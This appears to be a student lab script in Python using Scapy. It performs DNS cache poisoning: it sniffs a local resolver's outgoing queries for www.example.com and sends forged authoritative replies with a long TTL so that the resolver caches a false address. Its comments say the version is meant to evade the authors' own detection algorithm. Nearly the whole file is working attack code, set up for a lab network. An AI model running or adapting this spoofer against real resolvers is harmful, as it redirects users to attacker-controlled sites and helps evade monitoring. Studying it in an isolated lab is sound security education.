# Shebang line to indicate which interpreter is to be used by specifiying it's path
#!/usr/bin/env python3

#############################################################################
############################ ATTACK STRATEGY V.3 ############################

#
#      Contribution was not enough to split between two people. We just researched
#      ways to out-do detect v2
#
#      The only thing that is different in this code, as compared to attack v.1
#      is that the IP that we are sniffing is not the victim, but the local DNS server
#      When the user requests a specific IP mapping of a URL, considering the DNS server
#      does not already have the answer to this IP, this DNS server requests a DNS query
#      from a root server on a different network, that's where the attacker sniffs this
#      packet and send a wrong spoofed answer packet, and makes the DNS server save it in
#      cache, and then it drops any answer that arrives after from the real root server.
#      With that, the user would receive a normal DNS answer to the IP, and that would evade
#      detection V.2 algorithm.
#
#      The only change in this code, is on line 112, where the sniffed IP is 10.9.0.53
#      (local DNS server) instead of 10.9.0.5 (the victim)

#############################################################################
############################### ISSAM MISTO #################################

# import scapy to be used for creating packets and sending packets
from scapy.all import * 

# This function creates an IP Packet. We switch the source IP and destination IP
def create_IP_Packet(packet):

    # We set the destination to be the victim
    destination = packet[IP].src

    # We set the source to be the DNS server
    source = packet[IP].dst

    # make the packet and assign it's source and destination
    IPpacket = IP(dst= destination, src= source)
    
    return IPpacket

# This function creates a UDP Packet. We switch the source port number and destination port number
def create_UDP_Packet(packet):

    # We set the destination port to be the source port of the victim
    destination_port = packet[UDP].sport

    # make the packet and assign it's destination and source port
    UDPpacket = UDP(dport= destination_port , sport=53)

    return UDPpacket


#############################################################################
############################### ALI HIJJAWI #################################


# A function that creates the spoofed segment of the DNS packet with the fake domain
def createAnswerSegment(packet, fakeDomain):

  # here we get the DNS resource record which is the url the victim wants to access
  resourceRecord = packet[DNS].qd.qname

  # and we construct the answering segment which has the spoofed domain that we want the victim to be rerouted to
  # type A here to indicate that it is intended to Host Address (destination)
  answerSegment = DNSRR(rrname = resourceRecord, type = 'A', ttl = 10000, rdata = fakeDomain)
  return answerSegment

# This function creates the whole DNS packet as if sent by the local DNS server
def createDNS(packet, answerSegment):

  # copies the packet id and question domain to pretend as if the packet is the answer to the victim's query DNS
  # as if sent by the DNS server (the ip and ports were swapped in the other functions)
  packetID = packet[DNS].id
  questionDomain = packet[DNS].qd

  # construction of a DNS packet with the proper configuration and spoofed answer taken from the previous function
  DNSpacket = DNS(id = packetID, qd = questionDomain,
                  aa = 1, rd = 0, qr = 1, qdcount = 1, ancount = 1, nscount = 0, arcount = 0,
                  an = answerSegment)
  return DNSpacket

# The main attack function
def executeAttack(packet):

  # this here is a check if the sniffed packets from the victim contain a DNS query request, specifically set to
  # see if "www.example.com" is the questioned domain, so that the attacket can execute the attack
  if (DNS in packet and 'www.example.com' in packet[DNS].qd.qname.decode('utf-8')):
    # a visual of the packet structure (IP UDP and DNS)
    packet.show()

    # creates the IP segment with attacker seeming to be the DNS server
    IPpacket = create_IP_Packet(packet)
    # creates the UDP segment that indicates the correct victim port and port 53 (as if from the DNS server)
    UDPpacket = create_UDP_Packet(packet)
    # creates the DNS segment with the falsified domain routing
    answerSegment = createAnswerSegment(packet, '5.4.3.2')
    DNSpacket = createDNS(packet, answerSegment)

    # joins the segments into a full packet and sends it in the local network to be routed towards the victim
    # who is currently expecting a DNS answer. This comes in as if it is an answer from the local DNS server,
    # the victim receives it and reroutes the user to the malicious website, noting that the victim receives it
    # before the DNS sends the true DNS answer. When the true packet arrives to the victim, they ignore it
    # and they stay on the malicious website
    spoofedPacket = IPpacket/UDPpacket/DNSpacket
    send(spoofedPacket)
  
  
# a filter to sniff packets specifically sent by this host towards port 53 - which is the local DNS server
packetFilter = 'udp and src host 10.9.0.53 and dst port 53'
# the scapy sniff function; it executes the attack as soon as it sniffs the DNS query packet
sniffedPacket = sniff(iface = 'br-68a034f7b70c', filter = packetFilter, prn = executeAttack)